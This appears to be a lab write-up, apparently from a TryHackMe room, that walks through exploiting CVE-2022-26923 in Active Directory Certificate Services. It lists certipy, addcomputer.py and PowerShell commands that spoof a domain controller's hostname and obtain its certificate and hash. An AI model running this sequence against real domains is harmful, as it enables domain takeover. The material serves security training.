# CVE-2022-26923

## Overview

1. Compromise the credentials of a low-privileged AD user.
2. Use those credentials to enrol a new host on the domain.
3. Alter the DNS hostname attribute of the Computer AD Object to that of a privileged host, such as a Domain Controller.
4. Remove the SPN attributed to bypass the unique SPN conflict issue.
5. Request a Machine certificate using the default template.
6. Perform Kerberos authentication with the received template, now as the privileged machine account instead of our fake machine account.

## Exploitation

<table><thead><tr><th width="209">Info</th><th>Command</th></tr></thead><tbody><tr><td>Request Certificate</td><td><code>certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User</code></td></tr><tr><td>Verify that this certificate is valid</td><td><code>certipy auth -pfx thm.pfx</code></td></tr><tr><td>Add Computer to the domain</td><td><code>addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'</code></td></tr><tr><td>Generate Certificate for new computer</td><td><code>certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine</code></td></tr><tr><td>Verify new Certificate</td><td><code>certipy auth -pfx thmpc.pfx</code></td></tr><tr><td>List Current Computer object</td><td><code>Get-ADComputer THMPC -properties dnshostname,serviceprincipalname</code></td></tr><tr><td>Remove current SPN</td><td><code>Set-ADComputer THMPC -ServicePrincipalName @{}</code></td></tr><tr><td>Change hostname to be that of the DC</td><td><code>Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com</code></td></tr><tr><td>Verify change</td><td><code>Get-ADComputer THMPC -properties dnshostname,serviceprincipalname</code></td></tr><tr><td>Forge a malicious certificate</td><td><code>certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine</code></td></tr><tr><td>Verify certificate and get hash</td><td><code>certipy auth -pfx lundc.pfx</code></td></tr></tbody></table>
